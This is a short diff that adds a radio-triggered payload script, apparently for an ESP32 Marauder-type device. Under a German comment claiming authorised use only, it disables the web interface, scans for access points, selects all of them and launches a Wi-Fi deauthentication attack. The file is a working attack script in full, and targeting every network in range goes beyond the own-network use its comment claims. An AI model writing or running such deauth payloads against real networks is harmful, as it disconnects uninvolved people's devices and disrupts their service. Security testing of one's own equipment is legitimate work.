@@ -1,0 +1,7 @@
+REM G4MEOVER — Deauth (nur autorisierte Tests / eigenes Netz). Funk-getriggert.
+WEB_OFF
+ESP32M scanap
+DELAY 8000
+ESP32M stopscan
+ESP32M select -a all
+ESP32M attack -t deauth
